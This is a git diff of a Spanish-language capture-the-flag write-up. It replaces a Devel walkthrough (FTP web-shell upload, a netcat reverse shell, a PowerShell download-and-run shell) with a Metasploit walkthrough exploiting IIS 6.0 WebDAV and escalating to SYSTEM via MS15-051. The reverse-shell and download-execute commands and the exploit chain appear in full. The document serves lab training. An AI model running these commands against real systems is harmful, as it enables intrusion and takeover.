@@ -67,170 +67,245 @@ el nmap que arrojamos fue el siguiente:
   Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-Podemos ver que tenemos un puerto 21 ftp abierto y un puerto 80 con http funcionado, por ende, aondaremos con un -sC -sV en el peurto 21 y el 80 intentando encontrar algun tipo de script que podamos usar.
+podemos ver que tenemos un supuesto IIS antiguo que va acorde al nombre de la maquina como tal
+
+> Microsoft-IIS/6.0
+
+buscando en searchsploit tenemos algo como esto:
 
 ```Python
-root@kali# nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 21:44 EST
-Nmap scan report for 10.10.10.5
-Host is up (0.019s latency).
-
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     Microsoft ftpd
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| 03-18-17  01:06AM       <DIR>          aspnet_client
-| 03-17-17  04:37PM                  689 iisstart.htm
-|_03-17-17  04:37PM               184946 welcome.png
-| ftp-syst:
-|_  SYST: Windows_NT
-80/tcp open  http    Microsoft IIS httpd 7.5
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/7.5
-|_http-title: IIS7
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
+root@kali:~/hackthebox/granny# searchsploit IIS 6.0
+-------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                            |  Path
+                                                                          | (/usr/share/exploitdb/platforms)
+-------------------------------------------------------------------------- ----------------------------------
+Microsoft IIS 6.0 - (/AUX/.aspx) Remote Denial of Service                 | ./windows/dos/3965.pl
+Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass                   | ./windows/remote/8704.txt
+Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass Exploit (Patch)   | ./windows/remote/8754.patch
+Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass Exploit (PHP)     | ./windows/remote/8765.php
+Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass Exploit (Perl)    | ./windows/remote/8806.pl
+Microsoft IIS 5.0/6.0 FTP Server - Remote Stack Overflow Exploit (Windows | ./windows/remote/9541.pl
+Microsoft IIS 5.0/6.0 FTP Server (Stack Exhaustion) Denial of Service     | ./windows/dos/9587.txt
+Microsoft IIS 6.0 ASP - Stack Overflow (Stack Exhaustion) Denial of Servi | ./windows/dos/15167.txt
+Microsoft IIS 6.0 / 7.5 (+ PHP) - Multiple Vulnerabilities                | ./windows/remote/19033.txt
+-------------------------------------------------------------------------- ----------------------------------
 ```
 
-veemos que podemos acceder con **Anonymous** a la red del ftp y tenemos algunos archivos, como **welcome.png y iisstart.htm**
+volviendo al nmap tenemos un supuesto WebDAV type funcionando, por lo cual nos podria venir bien algun exploit en el modulo de metasploit.
 
-revisando el http 80 obtenemos lo siguiente:
-![](/TheusZero/images/post/WindowsMachines/Devel/4.png)
+aqui lo haremos de dos formas, una por Metasploit y otra explicada sin metasploit.
 
-esta imagen corresponde a la misma que se encuentra en el ftp llamada welcome, por ende, podemos intuir que el ftp corresponde a un directorio web que se ejecuta en la maquina, para comprobarlo revisamos el archivo **iisstart.htm**, entonces:
-
-> http://10.10.10.5/iisstart.htm
->> nos deberia mostrar algun tipo de respuesta
-
-Obtenemos esto:
+## Metasploit
 
 ```Python
-HTTP/1.1 200 OK
-Content-Type: text/html
-Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
-Accept-Ranges: bytes
-ETag: "37b5ed12c9fd21:0"
-Server: Microsoft-IIS/7.5
-X-Powered-By: ASP.NET
-Date: Mon, 25 Feb 2019 10:40:02 GMT
-Connection: close
-Content-Length: 689
+root@kali:~/hackthebox/granny# msfconsole -q
+msf > search webdav
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+   Name                                                      Disclosure Date  Rank       Description
+   ----                                                      ---------------  ----       -----------
+   auxiliary/scanner/http/dir_webdav_unicode_bypass                           normal     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
+   auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                      normal     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
+   auxiliary/scanner/http/webdav_internal_ip                                  normal     HTTP WebDAV Internal IP Scanner
+   auxiliary/scanner/http/webdav_scanner                                      normal     HTTP WebDAV Scanner
+   auxiliary/scanner/http/webdav_website_content                              normal     HTTP WebDAV Website Content Scanner
+----------------------------SNIP-----------------------------
+   exploit/windows/http/sap_host_control_cmd_exec            2012-08-14       average    SAP NetWeaver HostControl Command Injection
+   exploit/windows/http/xampp_webdav_upload_php              2012-01-14       excellent  XAMPP WebDAV PHP Upload
+   **exploit/windows/iis/iis_webdav_scstoragepathfromurl**       2017-03-26       manual      Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+   exploit/windows/iis/iis_webdav_upload_asp                 1994-01-01       excellent  Microsoft IIS WebDAV Write Access Code Execution
+   exploit/windows/iis/ms03_007_ntdll_webdav                 2003-05-30       great      MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
+   exploit/windows/local/ms16_016_webdav                     2016-02-09       excellent  MS16-016 mrxdav.sys WebDav Local Privilege Escalation
+   exploit/windows/misc/ibm_director_cim_dllinject           2009-03-10       excellent  IBM System Director Agent DLL Injection
+   exploit/windows/misc/vmhgfs_webdav_dll_sideload           2016-08-05       normal     DLL Side Loading Vulnerability in VMware Host Guest Client Redirector
+   exploit/windows/scada/ge_proficy_cimplicity_gefebt        2014-01-23       excellent  GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
+   exploit/windows/ssl/ms04_011_pct                          2004-04-13       average    MS04-011 Microsoft Private Communications Transport Overflow
+   post/windows/escalate/droplnk                                              normal     Windows Escalate SMB Icon LNK Dropper
+
 ```
-exito, ya tenemos por donde explotar
 
-## obtencion de una shell
+seleccionamos el exploit entonces:
 
-windows rara vez tiene netcat o alguna reverse shell de las que tiene pentesteyMonkey por ende, debemos usar algunas diferentes que el sistema suele tener.
-Con este comando obtenemos algunas reverse shell con aspx
+> use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+
+con esto abrimos las opciones y agregamos el RHOSTS
 ```Python
-root@kali# locate cmd.aspx
-/usr/share/davtest/backdoors/aspx_cmd.aspx
-/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
-root@kali# cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
+
+  [*] Started reverse TCP handler on 10.10.14.18:4444 
+  [*] Trying path length 3 to 60 ...
+  [*] Sending stage (180291 bytes) to 10.10.10.15
+  [*] Meterpreter session 1 opened (10.10.14.18:4444 -> 10.10.10.15:1031) at 2019-10-21 20:12:40 -0400
+
+  meterpreter >
 ```
+listo, estamos dentro de meterpreter y se creo una session.
 
-> usando la de /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
+#### explotacion via metasploit
 
-entramos al ftp y subimos la shell 
-```Python
-ftp> put cmd.aspx  
-local: cmd.aspx remote: cmd.aspx 
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-226 Transfer complete.                              
-1442 bytes sent in 0.00 secs (985.4465 kB/s) 
-```
-
-vamos al 80 y revisamos la shell 
-
-> http://10.10.10.5/cmd.aspx
-
-![](/TheusZero/images/post/WindowsMachines/Devel/5.png)
-
-subiremos el binario de netcat ahora para entablar una buena reverse shell
-
-![](/TheusZero/images/post/WindowsMachines/Devel/6.png)
-
-o bien 
-
-```Python
-root@kali# locate nc.exe
-/opt/SecLists/Web-Shells/FuzzDB/nc.exe
-/opt/shells/netcat/nc.exe
-/usr/lib/mono/4.5/cert-sync.exe
-/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
-/usr/share/sqlninja/apps/nc.exe
-/usr/share/windows-binaries/nc.exe
-```
-ahora lo subiremos a ftp usando BINARY ya que asi la data no se corrompe, recordar utilizar md5
-
-con netcat ya subido, lo buscamos usando recursion sobre el disco C:
-![](/TheusZero/images/post/WindowsMachines/Devel/7.png)
-```Python
-C:/Ruta/nc.exe -e cmd.exe 10.10.14.14 443
-```
-![](/TheusZero/images/post/WindowsMachines/Devel/devel-shell.gif)
-lo ejecutamos y estamos dentro
-
-#### Nishang
-
-> https://github.com/samratashok/nishang
-
-Nishang es un framework de scripts y payloads para windows, especificamente para activar y usar la PowerShell que siempre es mas recomendable que el cmd.
-
-primero hay que clonar en nuestro sistema el nishang
+ahora vamos a sacar una shell interactiva con metasploit:
 
 ```Python
-root@kali:/opt# git clone https://github.com/samratashok/nishang.git
-Cloning into 'nishang'...
-remote: Enumerating objects: 1660, done.
-remote: Total 1660 (delta 0), reused 0 (delta 0), pack-reused 1660
-Receiving objects: 100% (1660/1660), 6.62 MiB | 23.70 MiB/s, done.
-Resolving deltas: 100% (1040/1040), done.
+meterpreter > shell
+[-] Failed to spawn shell with thread impersonation. Retrying without it.
+Process 3388 created.
+Channel 2 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+nt authority\network service
 ```
 
-luego hay que copiar **InvokePowerShellTcp.ps1** desde **/opt/nishang/Shells/**.
-
-> escribimos en **InvokePowerShellTcp.ps1** en el final lo siguiente:
->> Invoke-PowerShellTcp -Reverse -IPAddress MiIp -Port 443
-
-lo subimos a la maquina y lo ejecutamos escribriendo el siguiente comando.
-
-> start /b powershell IEX(New-Object Net.WebClient).downloadString('http://MyIpLoco:Puerto/InvokePowerShellTcp.ps1')
-
-> recordar que son 2 sesiones diferentes de netcat. ojito.
-
-listop, ahi tendriamos acceso a una powerShell. **PERO** muchas de las cosas que nos salen podrian ser falsos positivios.
-
-Para evitar esto podemos hacer lo siguiente:
+Procedemos a migrar proceso, para evitar error en la ejecución del exploit de escalamiento de privilegios. El proceso al cual se migrará, debe estar siendo ejecutado con los mismos privilegios que nuestro proceso actual, es decir, con cuenta de servicio de red (NT AUTHORITY\Network Service).
 ```Python
-[Environment]::Is64BitsOperatingSystem //si es true entonces tamos bien
+  meterpreter > ps
+
+  Process List
+  ============
+
+  PID   PPID  Name               Arch  Session  User                          Path
+  ---   ----  ----               ----  -------  ----                          ----
+  0     0     [System Process]                                                
+  4     0     System                                                          
+  272   4     smss.exe                                                        
+  324   272   csrss.exe                                                       
+  348   272   winlogon.exe                                                    
+  396   348   services.exe                                                    
+  408   348   lsass.exe                                                       
+  584   396   svchost.exe                                                     
+  676   396   svchost.exe                                                     
+  732   396   svchost.exe                                                     
+  760   396   svchost.exe                                                     
+  796   396   svchost.exe                                                     
+  932   396   spoolsv.exe                                                     
+  960   396   msdtc.exe                                                       
+  1072  396   cisvc.exe                                                       
+  1120  396   svchost.exe                                                     
+  1168  396   inetinfo.exe                                                    
+  1212  396   svchost.exe                                                     
+  1332  396   VGAuthService.exe                                               
+  1400  396   vmtoolsd.exe                                                    
+  1456  396   svchost.exe                                                     
+  1596  396   svchost.exe                                                     
+  1708  396   alg.exe                                                         
+  1828  2340  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+  1832  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+  1912  396   dllhost.exe                                                     
+  2280  1072  cidaemon.exe                                                    
+  2308  584   wmiprvse.exe                                                    
+  2340  1456  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+  2408  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+  2496  1072  cidaemon.exe                                                    
+  2520  1072  cidaemon.exe                                                    
+  2892  348   logon.scr  
 ```
+siendo **davcdata.exe** el que usaremos, entonces:
 
 ```Python
-[Environment]::Is64BitsProcess
+  meterpreter > migrate 2408
+  [*] Migrating from 1828 to 2408...
+  [*] Migration completed successfully.
 ```
-> si es falso, este proceso de shell es de 32bits, por lo que tenemos que migrar a mano a un proceso de 64 bits si o si debemos migrar
 
-```start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://MyIpAdrress:8000/Invoke_PowerShellTCP.ps1')```
+Enviamos la sesión a background, para ejecutar el exploit de escalamiento de privilegios.
+```Python
+  meterpreter > background 
+  [*] Backgrounding session 1...
+```
+Procedemos a utilizar “Metasploit Local Exploit Suggester”, el cual, verificará y entregará vulnerabilidades locales que podemos explotar desde la sesión obtenida anteriormente.
+```Python
+  msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
+```
+Revisión de opciones.
+```Python
+  msf5 post(multi/recon/local_exploit_suggester) > show options 
 
-> recordar que tenemos que tener una session de netcat en el puerto 443 abierta.
+  Module options (post/multi/recon/local_exploit_suggester):
 
-con esto logramos crear una powerShell que trabaje en 64bits, por lo que volvemos a lanzar un netcat para obtener la reverse shell otra vez
+  Name             Current Setting  Required  Description
+  ----             ---------------  --------  -----------
+  SESSION                           yes       The session to run this module on
+  SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+```
+Configuración de opciones.
+```Python
+  msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
+  SESSION => 1
+```
+Ejecución de “Metasploit Local Exploit Suggester”.
+```Python
+  msf5 post(multi/recon/local_exploit_suggester) > run
 
-> preguntamos otra vez :
->> ```[Environment]::Is64BitsProcess```
+  [*] 10.10.10.15 - Collecting local exploits for x86/windows...
+  [*] 10.10.10.15 - 29 exploit checks are being tried...
+  [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+  [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+  [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+  [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+  [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
+  [+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
+  [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+  [*] Post module execution completed
+```
+Selección de exploit sugerido.
+```Python
+  msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
+```
+Revisión de opciones de exploit sugerido.
+```Python
+  msf5 exploit(windows/local/ms15_051_client_copy_image) > show options 
 
-una vez que es true podemos continuar y no van a darnos falsos positivos
+  Module options (exploit/windows/local/ms15_051_client_copy_image):
 
-#### root
-con un systeminfo obtenemos la version de la maquina: 
-![](/TheusZero/images/post/WindowsMachines/Devel/8.png)
-ya con esto podemos dar por entendido que version es, ahora al colocarla en google podemos acceder a un exploit simple de nombre:
-> MS11-046 exploit (buscar en github)
-
-subimos el binario que esta disponible y listo, somos root. 
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SESSION                   yes       The session to run this module on.
 
 
+  Exploit target:
+
+  Id  Name
+  --  ----
+  0   Windows x86
+  
+Configuración de opciones de exploit sugerido.
+
+  msf5 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
+  SESSION => 1
+  msf5 exploit(windows/local/ms15_051_client_copy_image) > set LHOST 10.10.14.18
+  LHOST => 10.10.14.18
+```
+Ejecución de exploit sugerido.
+```Python
+  msf5 exploit(windows/local/ms15_051_client_copy_image) > run
+
+  [*] Started reverse TCP handler on 10.10.14.18:4444 
+  [*] Launching notepad to host the exploit...
+  [+] Process 3828 launched.
+  [*] Reflectively injecting the exploit DLL into 3828...
+  [*] Injecting exploit into 3828...
+  [*] Exploit injected. Injecting payload into 3828...
+  [*] Payload injected. Executing exploit...
+  [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+  [*] Sending stage (180291 bytes) to 10.10.10.15
+  [*] Meterpreter session 2 opened (10.10.14.18:4444 -> 10.10.10.15:1033) at 2019-10-21 20:24:12 -0400
+
+  meterpreter > shell
+  Process 4012 created.
+  Channel 1 created.
+  Microsoft Windows [Version 5.2.3790]
+  (C) Copyright 1985-2003 Microsoft Corp.
+
+  C:\WINDOWS\system32>whoami
+  whoami
+  nt authority\system
+```
+
+
+
+## OSCP
